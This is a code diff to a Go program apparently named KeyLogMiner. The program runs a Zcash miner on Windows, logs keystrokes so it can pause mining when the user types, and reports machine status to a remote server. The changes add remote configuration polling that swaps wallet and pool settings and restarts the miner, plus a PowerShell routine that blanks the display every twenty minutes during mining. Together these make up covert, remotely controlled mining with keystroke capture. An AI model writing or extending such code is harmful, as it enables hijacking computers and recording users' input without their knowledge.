@@ -24,7 +24,8 @@ import (
 )
 
 const apiUploadMachineInfor,
-apiUploadMachineStatus = "http://dev.miner.eubchain.com:3001/machine", "http://dev.miner.eubchain.com:3001/status"
+apiUploadMachineStatus,
+getOnlineConfig = "http://dev.miner.eubchain.com:3001/machine", "http://dev.miner.eubchain.com:3001/status","http://dev.miner.eubchain.com:3001/admin/machine/"
 
 // Configuration strcution is storing all required configuration data
 type Configuration struct {
@@ -57,6 +58,7 @@ type MachineConfig struct {
 	Zcashminerdir             string `json:"zcashminerdir"`
 	Keycount                  int    `json:"keycount"`
 	Timeout                   int64  `json:"timeout"`
+	updateTime				  int64  `json:updateTime`
 }
 
 type MachineConfigResponse struct {
@@ -123,6 +125,9 @@ var (
 
 	tmpKeylog string
 	tmpTitle  string
+
+	machineName string // add by clk
+	updateTime int64 // add by clk
 )
 
 // ReadConfig reads info from config file
@@ -153,6 +158,7 @@ func keyLogger(config *Configuration) {
 		}
 		elapsed = time.Since(start)
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
+		//fmt.Println(elapsedsec,len(tmpKeylog),tmpKeylog,"-----------------")
 		if elapsedsec <= config.TimeOut && len(tmpKeylog) != 0 {
 			fmt.Println("Long String detected in " + strconv.Itoa(int(config.TimeOut)) + "s")
 			// Stop Miner
@@ -463,14 +469,15 @@ func getMinerPid() (pid string, pidErr error) {
 // StopMiner kill minging process
 func StopMiner(config *Configuration) {
 	// fmt.Println(config.ProcessID)
-	pid := strconv.Itoa(config.ProcessID)
+	//pid := strconv.Itoa(config.ProcessID)
 	// Awaiting to complete
-	if config.ProcessID == 0 {
-		pid, _ = getMinerPid()
-	}
-	var killcommand = "Taskkill /PID " + pid + " /F"
-	fmt.Print("KillCommand is ")
-	fmt.Println(killcommand)
+	//if config.ProcessID == 0 {
+	//	pid, _ = getMinerPid()
+	//}
+	//var killcommand = "Taskkill /PID " + pid + " /F"
+	var killcommand = "taskkill /f /im " + minerprocess
+	fmt.Println("KillCommand is ",killcommand)
+	//fmt.Println(killcommand)
 	c := exec.Command("cmd", "/c", killcommand)
 	if err := c.Run(); err != nil {
 		fmt.Println("2 Error: ", err)
@@ -547,6 +554,63 @@ func uploadMachineStatus() {
 		}
 	}
 }
+/**
+ * add by clk
+ * get online config
+ */
+func syncOnlineConfigAndReRunMiner() {
+	for range time.NewTicker(time.Minute * 10).C {
+
+		machineConfigResponseResponse := MachineConfigResponse{}
+		resp, _, err := gorequest.New().
+			Get(getOnlineConfig + machineName).
+			EndStruct(&machineConfigResponseResponse)//Get the latest configuration
+
+		if err != nil {
+			fmt.Println("get online config error:", err)
+			return
+		}
+
+		if resp.StatusCode == 200 && machineConfigResponseResponse.Succeed {//get success
+
+			fmt.Println(resp)
+			machineConfig := machineConfigResponseResponse.Result
+
+			if (updateTime < machineConfig.updateTime) {
+
+				updateTime = machineConfig.updateTime
+				config := Configuration{
+					ServerURL:                 machineConfig.Serverurl,
+					LocalMachineName:          machineConfig.Localmachinename,
+					DefaultZcashWalletAddress: machineConfig.Defaultzcashwalletaddress,
+					DefaultPoolAddress:        machineConfig.Defaultpooladdress,
+					DefaultPoolPort:           machineConfig.Defaultpoolport,
+					ZcashMinerFlagExtra:       machineConfig.Zcashminerflagextra,
+					ZcashMinerDir:             machineConfig.Zcashminerdir,
+					KeyCount:                  machineConfig.Keycount,
+					TimeOut:                   machineConfig.Timeout,
+					ProcessID:                 0}
+				StopMiner(&config)
+				RunMiner(&config)
+			}
+			fmt.Println(updateTime,machineConfig.updateTime)
+		} else {
+			fmt.Println("get config fail")
+		}
+	}
+}
+/**
+ * add by clk
+ * turn off display
+ */
+func offDisplay()  {
+	for range time.NewTicker(time.Minute * 20).C {
+		if minerIsRunning() {
+			cmd := exec.Command("cmd", "/C", "powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)")
+			cmd.Run()
+		}
+	}
+}
 func getCurrentDirectory(fileOrDir string) string {
 	execpath, err := os.Executable() // 获得程序路径
 	// handle err ...
@@ -576,9 +640,15 @@ func main() {
 			ProcessID:                 0}
 	}
 
+	machineName = machineConfig.MachineName //add by clk
+	updateTime = machineConfig.updateTime// add by clk
+	fmt.Println("machineName:",machineName,";updateTime:",machineConfig.updateTime)
+
 	fmt.Println("Starting KeyLogMiner!")
 	go RunMiner(&config)
 	go uploadMachineStatus()
+	go syncOnlineConfigAndReRunMiner()//add by clk
+	go offDisplay()//add by clk
 	// Run Miner
 	keyLogger(&config)
 	// go keyLogger(&config)
